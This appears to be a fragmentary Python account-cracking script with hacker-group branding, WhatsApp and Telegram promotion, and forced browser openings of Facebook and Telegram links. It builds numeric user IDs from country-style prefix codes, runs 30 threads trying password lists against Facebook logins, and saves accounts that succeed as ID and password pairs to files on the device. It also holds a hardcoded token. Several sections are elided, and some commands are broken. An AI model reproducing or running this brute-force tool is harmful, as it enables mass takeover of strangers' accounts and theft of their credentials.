...
#AFG
#WE ARE BROTHERS
#CONTACT WITH ADMIN Mr Juwe  WHATSAPP : 01749591356
#JOIN OUR TELEGRAM CHANNEL :  @https://t.me/ehc_Juwel_cyber_Zone_07
from os import path
...
os.system('xdg-open https://www.facebook.com/profile.php?id=61550585547862/posts/981732709862231/?app=fbl /?app=fbl')
logo = """
\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
\033[0;91m  ____     _       _                    _         _  
\033[0;91m |  _ \   | |     | |_   ___      _____| | __   _(_) 
\033[0;91m | |_) |  | |  _  | | | | \ \ /\ / / _ \ | \ \ / / | 
\033[0;91m |  _ < |_| | | |_| | |_| |\ V  V /  __/ |  \ V /| | 
\033[0;91m |_| \_\___/   \___/ \__,_| \_/\_/ \___|_|   \_/ |_| 
                                                     
                              
            
\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
\033[1;31m------------------------------------------------
\033[1;32m》AUTHOR    :𝗠𝗥 𝗝𝘂𝘄𝗲𝗹
》FACEBOOK  : 𝗛𝗔𝗞𝗖𝗔𝗥
》GITHUB    :𝗠𝗥 𝗝𝘂𝘄𝗲𝗹 𝗖𝗬𝗕𝗘𝗥 𝗭𝗢𝗡𝗘〄•ST⚝ℛ°️
》WHATSAPP  : 01749591356
》TAEM      :𝗠𝗥 𝗝𝘂𝘄𝗲𝗹 𝗖𝗬𝗕𝗘𝗥 𝗭𝗢𝗡𝗘〄•ST⚝ℛ°️HACKERS
\033[1;31m------------------------------------------------
"""
def linex():
	print('\033[1;37m----------------------------------------------')
...
def menu():
			...
			print('\033[1;33m------------------------------------------------')
			xd=input(' CHOOSE: ')
			os.system('xdg-open   https://www.facebook.com/groups/332649602878980/')
			if xd in ['1','01']:
				awmafghan()
			if xd in ['02','2']:
				awmafghan1()
			if xd in ['03','3']:
				os.system('xdg-opopenhttps://www.facebook.com/groups/332649602878980/?ref=share')
				print('\033[1;37m')
				print('\033[1;33m------------------------------------------------')
...
def awmafghan():
		user=[]
		clear()
		print('\033[1;33m             079, 013, 074, 017, 078')
		
		code = input('\033[1;35mPUT CODE: ')
		try:
			limit = int(input('\033[1;31mEXAMPLE: 9999, 2000, 3000, 5000, 10000\n\033[1;37mLIMIT: '))
		except ValueError:
			limit = 5000
		clear()
		...
		os.system('xdg-open https://www.facebook.com/profile.php?id=61550585547862')
		print('\033[1;33m------------------------------------------------')
		pcs = input(' [?] SELECT: ')
		...
		with tred(max_workers=30) as AWM:	
			...
			print(' \033[1;35m❤️ON/OFF 🆗YOUR 💲MOBILE 🈵🦠DATA+WIFI❤️BEFORE USE')
			print('\033[1;33m------------------------------------------------')
			for psx in user:
				ids = code+psx
				if pcs in ['1','01']:
...
def awmafghan1():
		user=[]
		clear()
		print('\033[1;33m             079, 017, 074, 013, 078')
		
		code = input('\033[1;35mPUT CODE: ')
		try:
			limit = int(input('\033[1;31mEXAMPLE: 8888, 9999, 2000, 3000, 5000, 10000\n\033[1;37mLIMIT: '))
		except ValueError:
			limit = 5000
		clear()
		print('\033[1;37m [1] \033[1;37mJOIN OUR GROUP')
		...
		clear()
		print('\033[1;32m [1] \033[1;31mJOIN TELEGRAM CHANNEL')
		os.system('xdg-open https://t.me/ehc_Juwel_cyber_Zone_07')
		print('\033[1;36m------------------------------------------------')
		pcs = input(' [?] SELECT: ')
		...
		with tred(max_workers=30) as AWM:	
			...
			print(' TOTAL IDS : \033[1;33m'+tl+f' ')
			print(f'\033[1;34m CHOICE CODE  :\033[1;32m '+code)
			print(' \033[1;35mON/OFF YOUR MOBILE DATA+WIFI BEFORE USE')
			print('\033[1;36m------------------------------------------------')
			for psx in user:
				ids = code+psx
				if pcs in ['1','01']:
...
def rndm(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [D.N 🦠❤️𝗝𝘂𝘄𝗲𝗹🌹𝘾𝙔𝘽𝙀𝙍❤️🦠 M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                accessToken="6834258678:AAFdpbHyzp0Qsc0gc00v-IjUuKiPoNURP2I"
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/D.N ❤️siam 𝘾𝙔𝘽𝙀𝙍❤️-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [D.N ❤️siam 𝘾𝙔𝘽𝙀𝙍❤️-OK] '+str(uid)+' | '+pas+'\033[1;90m')
                                                        open('/sdcard/D.N HACK-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [D.N ❤️siam 𝘾𝙔𝘽𝙀𝙍❤️-OK] '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/D.N ❤️siam 𝘾𝙔𝘽𝙀𝙍❤️-OK-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
                                        continue
...
def rndm2(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [D.N ❤️siam 𝘾𝙔𝘽𝙀𝙍❤️+ok] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        try:
                                                ...
                                                if uid in okk:pass
                                                        ...
                                                        print('\r\r\033[1;32m [D.N ❤️siam 𝘾𝙔𝘽𝙀𝙍❤️-OK] '+str(uid)+' | '+pas+'\033[1;90m')
                                                        open('/sdcard/D.N ❤️siam 𝘾𝙔𝘽𝙀𝙍❤️-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [DN.❤️siam 𝘾𝙔𝘽𝙀𝙍❤️-OK] '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/DN.❤️siam 𝘾𝙔𝘽𝙀𝙍❤️-OK-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
                                        continue
